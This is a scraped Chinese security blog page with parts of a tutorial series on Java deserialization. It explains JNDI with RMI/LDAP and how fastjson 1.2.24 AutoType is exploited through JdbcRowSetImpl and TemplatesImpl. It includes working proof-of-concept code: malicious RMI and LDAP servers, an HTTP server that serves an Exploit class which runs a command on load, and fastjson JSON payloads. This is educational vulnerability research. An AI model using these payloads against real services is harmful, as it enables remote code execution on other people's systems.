context = new InitialContext(); // 查找监听在本地 1099 端口上 RMI 服务的 Object 对象 Object obj = context.lookup(\u0026quot;rmi://localhost:1099/Object\u0026quot;); RMI 是什么 RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。\nRMI 有三个概念：\n Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。 Server : 远程方法的提供者。 Client : 远程方法的调用者。  远程方法的定义需要满足两个条件：\n 实现 java.rmi.Remote。 继承 java.rmi.server.UnicastRemoteObject。  RMI 使用示例 Registry 创建 Registry\nimport java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.util.concurrent.CountDownLatch; public class RmiRegistry { private final static Integer rmiPort = 1099; public static void main(String[] args) throws RemoteException, InterruptedException { // 创建一个 Registry  LocateRegistry.createRegistry(rmiPort); System.out.println(\u0026#34;RMI server started on: 0.0.0.0:\u0026#34; + rmiPort); // 阻塞主线程，避免程序退出  CountDownLatch countDownLatch = new CountDownLatch(1); countDownLatch.await(); } } Server 定义接口，目的是给 Client 使用。\nimport java.rmi.Remote; import java.rmi.RemoteException; public interface HelloService extends Remote { void sayHello(String name) throws RemoteException; } 定义实现类\nimport java.rmi.RemoteException; public class HelloServiceImpl implements HelloService { @Override public void sayHello(String name) throws RemoteException { System.out.println(\u0026#34;hello \u0026#34; + name); } } 注册对象，需要先使用 UnicastRemoteObject.exportObject() 将对象转换为 skeleton，skeleton 是 RMI 底层创建的一个代理对象，它继承了 java.rmi.server.UnicastRemoteObject，负责与 Client 进行网络通信。\nimport java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; public class Server { public static void main(String[] args) throws Exception { // 实例化要暴露的对象  HelloService helloService = new HelloServiceImpl(); // 将对象暴露出去，RMI 底层会创建该对象的一个代理对象，并监听一个端口用于处理来自客户端的请求  HelloService skeleton = (HelloService) UnicastRemoteObject.exportObject(helloService, 1100); /*================= 注册方式一开始 ====================*/ // 获取 Registry  Registry registry = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;, 1099); // 将这个对象注册到 Registry 中，第一个参数就是这个对象在 Registry 中的名称，客户端需要使用这个名称才能获取到这个对象  registry.bind(\u0026#34;helloService\u0026#34;, skeleton); /*================= 注册方式一结束 ====================*/ /*================= 注册方式二开始 ====================*/ // Naming.bind(\u0026#34;rmi://localhost:1099/helloService\u0026#34;, skeleton);  /*================= 注册方式二结束 ====================*/ System.out.println(\u0026#34;export helloService\u0026#34;); } } 可以看到注册方式二要比一简洁很多，这是 RMI 为了方便开发者使用，将注册方式一包装了一层，点击源码可以看到它的实现方式和注册方式一很相似。\npublic static void bind(String name, Remote obj) throws AlreadyBoundException, java.net.MalformedURLException, RemoteException { ParsedNamingURL parsed = parseURL(name); Registry registry = getRegistry(parsed); if (obj == null) throw new NullPointerException(\u0026#34;cannot bind to null\u0026#34;); registry.bind(parsed.name, obj); } Client 定义接口，因为 Server 和 Client 存在不同的 Java 程序中，Client 想要调用 Server 上面的服务需要知道方法才可以。\nimport java.rmi.Remote; import java.rmi.RemoteException; public interface HelloService extends Remote { void sayHello(String name) throws RemoteException; } 获取对象并调用，在这里获取到的对象是 stub，stub 负责与 Server 进行网络通信，例如在调用 sayHello() 方法时RMI通过网络请求位于服务端的真正方法，如果有返回值时还会将内容传递回来。\nimport java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main(String[] args) throws Exception { /*================= 获取方式一开始 ====================*/ Registry registry = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;, 1099); HelloService stub = (HelloService) registry.lookup(\u0026#34;helloService\u0026#34;); /*================= 获取方式一结束 ====================*/ /*================= 获取方式二开始 ====================*/ // HelloService stub = (HelloService) Naming.lookup(\u0026#34;rmi://localhost:1099/helloService\u0026#34;);  /*================= 获取方式二结束 ====================*/ stub.sayHello(\u0026#34;守法市民小杜\u0026#34;); } } 同理 Naming 也提供了获取远程对象的功能，它的源码如下：\npublic static Remote lookup(String name) throws NotBoundException, java.net.MalformedURLException, RemoteException { ParsedNamingURL parsed = parseURL(name); Registry registry = getRegistry(parsed); if (parsed.name == null) return registry; return registry.lookup(parsed.name); } 测试 按照 Registry \u0026gt; Server \u0026gt; Client 这个顺序启动，可以看到 Client 调用成功之后 Server 打印了如下内容：\nhello 守法市民小杜 Registry、Server、Client 的调用关系可以总结为这个图：\nJNDI + RMI 组合使用 定义 Registry import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.text.MessageFormat; public class RMIServer { private static final Integer rmiServerPort = 1099; private static final String httpServerAddress = \u0026#34;127.0.0.1\u0026#34;; private static final Integer httpServerPort = 80; public static void main(String[] args) throws Exception { // 工程地址，目的是让 JNDI 加载位于此处的类文件  String factoryLocation = MessageFormat.format(\u0026#34;http://{0}:{1}/\u0026#34;, httpServerAddress, httpServerPort + \u0026#34;\u0026#34;); // 创建 Registry  Registry registry = LocateRegistry.createRegistry(rmiServerPort); // 创建 JNDI 的引用  // className 远程对象的类名称，不能为null  // factory 加载类成功后要实例化的类名称  // factoryLocation 提供类文件的地址，为null时从本地加载  Reference reference = new Reference(\u0026#34;Exploit\u0026#34;, \u0026#34;Exploit\u0026#34;, factoryLocation); // 将 JNDI引用 包装为 RMI 可注册的类  ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); // 将类信息注册到 Registry  registry.bind(\u0026#34;Exploit\u0026#34;, referenceWrapper); System.out.println(\u0026#34;[*] RMI server listening on: 0.0.0.0:\u0026#34; + rmiServerPort); } } 可以看到我们创建 Registry 之后并没有 export 某一对象，是创建了一个 JNDI 的 Reference，目的是为了让 JNDI 去加载位于此处的类文件。\n既然我们指定了类文件的存放地址是一个HTTP地址，那我们生成一个类，并且将其存放到这个HTTP服务下。\n恶意类，简单起见不要添加包名称。\nimport java.io.IOException; public class Exploit { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } HTTP服务，这里我为了方便使用了 sun 公司内置在 jdk 中的一个http server，也可以使用 nginx、apache、tomcat 等web服务器，只需要将编译后的 Exploit.class 放到根目录下即可。\nimport com.sun.net.httpserver.HttpServer; import javassist.CannotCompileException; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import java.io.IOException; import java.io.OutputStream; import java.net.InetSocketAddress; public class WebServer { private static final Integer port = 80; public static void main(String[] args) throws IOException, NotFoundException, CannotCompileException { // 使用 javassist 获取类字节  ClassPool classPool = ClassPool.getDefault(); final CtClass ctClass = classPool.get(Exploit.class.getName()); // 修改类的名称，这里是为了去除类的包名，与 RMI Server 中保持一致  ctClass.setName(\u0026#34;Exploit\u0026#34;); final byte[] bytes = ctClass.toBytecode(); HttpServer server = HttpServer.create(new InetSocketAddress(port), 0); server.createContext(\u0026#34;/\u0026#34;, httpExchange -\u0026gt; { // 将类的字节写入到 response 中  System.out.println(\u0026#34;Req Begin...\u0026#34;); httpExchange.sendResponseHeaders(200, bytes.length); final OutputStream responseBody = httpExchange.getResponseBody(); responseBody.write(bytes); responseBody.close(); System.out.println(\u0026#34;Req End.\u0026#34;); }); System.out.println(\u0026#34;WebServer started at 0.0.0.0:\u0026#34; + port); server.start(); } } 最后我们写一个JNDI和RMI组合使用的测试\nimport javax.naming.InitialContext; import javax.naming.NamingException; public class JNDI_RMI { public static void main(String[] args) throws NamingException { InitialContext context = new InitialContext(); Object obj = context.lookup(\u0026#34;rmi://localhost:1099/Exploit\u0026#34;); System.out.println(\u0026#34;obj = \u0026#34; + obj); } } 请求之后会输出会是一段异常代码，并且弹出了计算器，这是正常的。\nException in thread \u0026quot;main\u0026quot; javax.naming.NamingException [Root exception is java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory] at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:472) at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:124) at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) at javax.naming.InitialContext.lookup(InitialContext.java:417) at cn.typesafe.jsv.fastjson.JNDI_RMI.main(JNDI_RMI.java:12) Caused by: java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163) at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319) at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:464) ... 4 more 我们点击进入异常堆栈提示的代码 at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)\nstatic ObjectFactory getObjectFactoryFromReference( Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException { Class\u0026lt;?\u0026gt; clas = null; // Try to use current class loader  try { clas = helper.loadClass(factoryName); } catch (ClassNotFoundException e) { // ignore and continue  // e.printStackTrace();  } // All other exceptions are passed up.  // Not in class path; try to use codebase  String codebase; if (clas == null \u0026amp;\u0026amp; (codebase = ref.getFactoryClassLocation()) != null) { try { clas = helper.loadClass(factoryName, codebase); } catch (ClassNotFoundException e) { } } return (clas != null) ? (ObjectFactory) clas.newInstance() : null; } 可以看到在加载类成功后使用反射创建了这个类，并且进行了强制转换，而我们定义的这个类和javax.naming.spi.ObjectFactory没有任何关系，在强转时必然异常，但这并不影响我们添加的代码已经执行了。\nJNDI和RMI的调用流程大致是：JNDI 在请求到 RMI 之后，RMI 返回了 Exploit 的 http 地址，JNDI 则通过网络获取到了这个类文件，通过类加载器将其加载到了JVM中并且实例化了这个类，而 Exploit 的静态代码块内是打开计算器的代码，实例化时就会执行这段代码。\nFastjson 的 RMI/JNDI 利用漏洞 在上一节中我们有讲到利用 fastjson 的 AutoType 功能，可以指定反序列化的类。安全人员利用 com.sun.rowset.JdbcRowSetImpl 的 JNDI 功能刚好能够触发上面介绍的那个流程。\ncom.sun.rowset.JdbcRowSetImpl 有两个重要属性\n dataSourceName 数据源名称 autoCommit 触发JNDI请求的关键参数  dataSourceName 的 set 方法可以忽略，就是一个正常的参数赋值。\nautoCommit 的 set 方法如下：\npublic void setAutoCommit(boolean var1) throws SQLException { if (this.conn != null) { this.conn.setAutoCommit(var1); } else { this.conn = this.connect(); this.conn.setAutoCommit(var1); } } com.sun.rowset.JdbcRowSetImpl 在反序列化后 conn 参数必然为空，会进入 this.connect() 方法，代码如下。\nprivate Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null \u0026amp;\u0026amp; !this.getUsername().equals(\u0026quot;\u0026quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\u0026quot;jdbcrowsetimpl.connect\u0026quot;).toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; } } 刚说了 conn 参数必然为空，因此就会执行 if 的第二个分支，进行了 JNDI 请求。\n因此构造一个 POC 也就十分简单了。\nimport com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = \u0026quot;{\\\u0026quot;@type\\\u0026quot;:\\\u0026quot;com.sun.rowset.JdbcRowSetImpl\\\u0026quot;,\\\u0026quot;dataSourceName\\\u0026quot;:\\\u0026quot;rmi://localhost:1099/Exploit\\\u0026quot;,\\\u0026quot;autoCommit\\\u0026quot;:true}\u0026quot;; JSON.parse(payload); } } 启动了 RMIServer 和 WebServer 后执行这段代码即可完成漏洞利用。\nLDAP + JNDI 2017年 Oracle 发布了新版 JDK 默认禁用了通过存储在命名和目录服务中的 JNDI 对象工厂进行远程类加载。要通过 RMI Registry 或 COS Naming 服务提供者启用远程类加载，请根据需要将以下系统属性设置为字符串“true”：\ncom.sun.jndi.rmi.object.trustURLCodebase com.sun.jndi.cosnaming.object.trustURLCodebase 详细的版本信息如下：\n   JRE 家庭版 JRE 安全基线（完整字符串）     8 1.8.0_121-b13   7 1.7.0_131-b12   6 1.6.0_141-b12    来源：https://www.oracle.com/java/technologies/javase/7u131-relnotes.html\n因此安全人员又挖掘到了基于 LDAP + JNDI 的利用方式，流程和 RMI + JNDI 基本相同。\n首先是创建一个 LDAP 服务，我们这里使用到了 unboundid-ldapsdk 这个库。\nimport com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.text.MessageFormat; public class LDAPServer { private static final String javaCodeBase = \u0026#34;http://127.0.0.1:80/\u0026#34;; private static final String javaClassName = \u0026#34;Exploit\u0026#34;; public static void main(String[] args) throws Exception { int port = 1389; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(\u0026#34;dc=example,dc=com\u0026#34;); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new EvalInMemoryOperationInterceptor()); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); ds.startListening(); } public static class EvalInMemoryOperationInterceptor extends InMemoryOperationInterceptor { @Override public void processSearchResult(InMemoryInterceptedSearchResult result) { String baseDN = result.getRequest().getBaseDN(); Entry e = new Entry(baseDN); e.addAttribute(\u0026#34;javaClassName\u0026#34;, javaClassName); e.addAttribute(\u0026#34;javaFactory\u0026#34;, javaClassName); e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, javaCodeBase); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); System.out.println(MessageFormat.format(\u0026#34;Send LDAP reference result for {0} redirecting to {1}{2}.class\u0026#34;, baseDN, javaCodeBase, javaClassName)); try { result.sendSearchEntry(e); } catch (LDAPException ex) { ex.printStackTrace(); } result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } Http 服务保持不变\n测试代码修改为\nimport com.alibaba.fastjson.JSON; public class Eval4 { public static void main(String[] args) throws Exception { String payload = \u0026quot;{\\\u0026quot;@type\\\u0026quot;:\\\u0026quot;com.sun.rowset.JdbcRowSetImpl\\\u0026quot;,\\\u0026quot;dataSourceName\\\u0026quot;:\\\u0026quot;ldap://127.0.0.1:1389/Exploit\\\u0026quot;, \\\u0026quot;autoCommit\\\u0026quot;:true}\u0026quot;; JSON.parse(payload); } } 只需要修改 dataSourceName 的地址。\n启动 LDAP 服务和 Http 服务后，执行测试代码也可以完成利用。\n但好景不长，Oracle 官方在 Java SE：6u201、7u191、8u182 也修复了这个问题。\n注 文中测试使用系统和工具版本如下：\n 操作系统 windows 10 20H2 jdk java 1.8.0_41-b04 fastjson 1.2.24 javassist 3.28.0-GA unboundid-ldapsdk 6.0.2 代码仓库 https://github.com/dushixiang/java-serialization-vulnerability  其他 挖掘漏洞是一个你来我往的过程，一个漏洞出现之后必然会伴随着后续版本的修复，除了那种已经不再更新的类库，因此在选择框架或类库时完善度和活跃度都是重要的度量标准。\nfastjson 在后续的版本中也很快修复了这些漏洞，但安全人员又不断挖掘新的利用方式，在下一篇我们也会介绍在 fastjson 几个重要版本的更新内容和新的利用方式，以及在高版本的JDK中如何利用。\n","permalink":"https://typesafe.cn/posts/java-serialization-vulnerability-4/","summary":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nJNDI 是什么 Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。\nJNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。\n 轻量级目录访问协议 (LDAP) CORBA 公共对象服务命名（COS naming） Java 远程方法调用 (RMI) 域名服务 (DNS)  这么说起来还是有点抽象，简单理解就是服务提供者提供一个类似Key Value的数据，JNDI可以通过这个 Key 获取到服务提供者上的提供的Value，因此JNDI是无法单独使用的。\n使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。\n// 创建一个上下文对象 InitialContext context = new InitialContext(); // 查找监听在本地 1099 端口上 RMI 服务的 Object 对象 Object obj = context.lookup(\u0026quot;rmi://localhost:1099/Object\u0026quot;); RMI 是什么 RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。\nRMI 有三个概念：\n Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。 Server : 远程方法的提供者。 Client : 远程方法的调用者。  远程方法的定义需要满足两个条件：","title":"Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理"},{"content":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\nFastjson 是什么  fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。\n  fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。\n 以上摘自Fastjson GitHub 介绍。\n但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。\n为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。\n这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。\n那为什么会有公司弃用 Fastjson 呢？\n或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。\n尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。\nFastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github.com/alibaba/fastjson/wiki/security_update_20170315 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version \u0026lt;= 1.2.24 时漏洞是如何产生的。\n我们先在 pom.xml 中增加 fastjson 1.2.24 的依赖。\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 下面先看一个最常见的序列化为JSON和反序列化为对象的过程。\n首先定义一个常见的 Java 对象。\npublic class User { private String name; private Integer age; public String getName() { System.out.println(\u0026#34;call getName\u0026#34;); return name; } public void setName(String name) { System.out.println(\u0026#34;call setName\u0026#34;); this.name = name; } public Integer getAge() { System.out.println(\u0026#34;call getAge\u0026#34;); return age; } public void setAge(Integer age) { System.out.println(\u0026#34;call setAge\u0026#34;); this.age = age; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } 编写一个测试类\nimport com.alibaba.fastjson.JSON; public class Eval0 { public static void main(String[] args) { User user = new User(); user.setName(\u0026#34;守法市民小杜\u0026#34;); user.setAge(26); String jsonString = JSON.toJSONString(user); System.out.println(\u0026#34;序列化后: \u0026#34; + jsonString); System.out.println(\u0026#34;反序列化开始\u0026#34;); System.out.println(\u0026#34;反序列化: \u0026#34; + JSON.parseObject(jsonString, User.class)); System.out.println(\u0026#34;反序列化结束\u0026#34;); } } 代码很简单，运行后会输出：\ncall setName call setAge call getAge call getName 序列化后: {\u0026#34;age\u0026#34;:26,\u0026#34;name\u0026#34;:\u0026#34;守法市民小杜\u0026#34;} 反序列化开始 call setAge call setName 反序列化: User{name=\u0026#39;守法市民小杜\u0026#39;, age=26} 反序列化结束 可以看到 Fastjson 在将JSON字符串反序列化为 Java 对象的时候调用了 set方法，看过《Java 反序列化漏洞原理》前两篇文章的同学可能会思考，我们能否构建一条利用链，让 Fastjson 在执行 set 方法的时候能够执行我们指定的命令。\n我们先假设这个方式成立，但目前存在两个问题：\n 如何让 Fastjson 将JSON字符串反序列化为我们指定的对象？ 哪一个对象可以在 set 的时候执行我们指定的命令呢？  第一个问题查看 Fastjson 文档后可以得到答案，当 JSON 字符串的第一个 key 为 @type 时，会将 JSON 字符串反序列化为 @type 对应 value 中指定的 Java 类，这就是 Fastjson 的 AutoType 功能。并且 Fastjson 在反序列化带有 @type 的 JSON 字符串时，如果没有指定Java对象的类型，还会调用其成员变量的 get 方法。\n我们稍微改动一下测试类，在序列化为JSON时将类型也写进去，在反序列化时将类型去除：\nimport com.alibaba.fastjson.JSON; import com.alibaba.fastjson.serializer.SerializerFeature; public class Eval1 { public static void main(String[] args) { User user = new User(); user.setName(\u0026#34;守法市民小杜\u0026#34;); user.setAge(26); String jsonString = JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(\u0026#34;序列化后: \u0026#34; + jsonString); System.out.println(\u0026#34;反序列化开始\u0026#34;); System.out.println(\u0026#34;反序列化: \u0026#34; + JSON.parseObject(jsonString)); System.out.println(\u0026#34;反序列化结束\u0026#34;); } } 执行后会输出：\ncall setName call setAge call getAge call getName 序列化后: {\u0026#34;@type\u0026#34;:\u0026#34;cn.typesafe.jsv.fastjson.User\u0026#34;,\u0026#34;age\u0026#34;:26,\u0026#34;name\u0026#34;:\u0026#34;守法市民小杜\u0026#34;} 反序列化开始 call setAge call setName call getAge call getName 反序列化: {\u0026#34;name\u0026#34;:\u0026#34;守法市民小杜\u0026#34;,\u0026#34;age\u0026#34;:26} 反序列化结束 可以看到确实是调用了 Java 对象的 get 方法，所以如果 get 方法能够触发代码执行也是可以的。\nTemplatesImpl 的利用链 扩大条件后，第二个问题研究安全的前辈也已经帮我们找到了一个合适的 Java 对象 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl。\n它的成员变量如下：\npublic final class TemplatesImpl implements Templates, Serializable { static final long serialVersionUID = 673094361519270707L; public final static String DESERIALIZE_TRANSLET = \u0026#34;jdk.xml.enableTemplatesImplDeserialization\u0026#34;; // 父抽象类的完整包名称  private static String ABSTRACT_TRANSLET = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; // 不重要，只要不为空就行  private String _name = null; // 存放字节数组的数组  private byte[][] _bytecodes = null; // Class 数组  private Class[] _class = null; // translet 子类在 _class 中的下标  private int _transletIndex = -1; // 存放 class 的容器，可以忽略  private Hashtable _auxClasses = null; // 此字段不能为 null，因为要让 Fastjson 调用 getOutputProperties 方法  private Properties _outputProperties; // 其他成员变量可以忽略  } 我们首先就来看 _outputProperties 对应的 getOutputProperties 方法：\npublic synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } 代码很简单，重要的是 newTransformer() 方法，代码如下：\npublic synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 其中 getTransletInstance() 代码如下：\nprivate Translet getTransletInstance() throws TransformerConfigurationException { try { // _name 不能为 null，不然就直接返回了  if (_name == null) return null; // _class 不能赋值，要进入 defineTransletClasses 才能将我们准备的 Class 加载进来  if (_class == null) defineTransletClasses(); // 从加载成功的Class中找到 AbstractTranslet 的子类使用反射创建对象，newInstance() 会调用默认的无参构造方法，因此只要在构造方法中添加我们需要的代码就能做到任意代码执行  AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); // 下面的代码不重要了  translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } defineTransletClasses() 方法代码如下：\nprivate void defineTransletClasses() throws TransformerConfigurationException { // _bytecodes 不能为 null  if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } // 获取类加载器  TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader()); } }); try { // 获取二维数组的长度，一个字节数组对应一个 Class  final int classCount = _bytecodes.length; _class = new Class[classCount]; // 判断 Class 数量长度大于1就初始化一个容器用于存放 Class，对我们来说没啥用，可以忽略  if (classCount \u0026gt; 1) { _auxClasses = new Hashtable(); } for (int i = 0; i \u0026lt; classCount; i++) { // 使用类加载器将字节数组加载为 Class  _class[i] = loader.defineClass(_bytecodes[i]); // 获取其父类 Class  final Class superClass = _class[i].getSuperclass(); // 判断当前 Class 的父类 Class 名称是否为 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet  if (superClass.getName().equals(ABSTRACT_TRANSLET)) { // 赋值 translet Class 在数组中的下标  _transletIndex = i; } else { // 存储 Class 名称及 Class，对我们来说没啥用，可以忽略  _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 到目前为止，基本的利用链我们已经搞清楚了，先让 Fastjson 在反序列化的时候将 TemplatesImpl 的几个关键成员变量赋值，如将 _bytecodes 字段赋值为我们事先准备好的字节数组，这样在 Fastjson 调用 getTransletInstance 的时候会接着调用 defineTransletClasses 方法将字节数组使用类加载器加载对 Class，完成之后会再找到 class 数组 _class 中 AbstractTranslet 的子类 Class 使用反射调用无参构造方法创建对象，而这个对象是我们可以控制的，在其构造方法中添加任意代码完成利用。\n但是还有三个问题：\n 如何将 Java Class 文件转换为字节？ 如何将 Java Class 字节序列化为 Fastjson 可以识别的 JSON 内容？ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 中我们需要操作的那几个成员变量都是以下划线为开头的，并且只有 get 方法没有 set 方法，Fastjson 要如何进行反序列化？  第一个问题我们可以直接使用 IO 流将 Java Class 文件读取到字节数组中，但这样太过粗暴且不利于移植，因此我们可以使用操作 Java 字节码库 javassist 来获取 Class 字节数组。\n第二个问题需要我们将 Class 字节数组进行 Base64 编码，Fastjson 在反序列化的时候会自动进行解码。\n第三个问题需要我们在反序列化JSON字符串时指定 Fastjson 支持没有 set 方法的成员变量，因此也注定了此种方式可利用范围较小。\n测试 在 pom.xml 中增加 javassist 依赖。\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.28.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 编写测试代码：\nimport com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import javassist.ClassPool; import javassist.CtClass; import java.io.IOException; import java.util.Base64; import java.util.Collections; import java.util.LinkedHashMap; import java.util.Map; public class Eval2 { public static class EvalTransletClass extends AbstractTranslet { public EvalTransletClass() throws IOException { 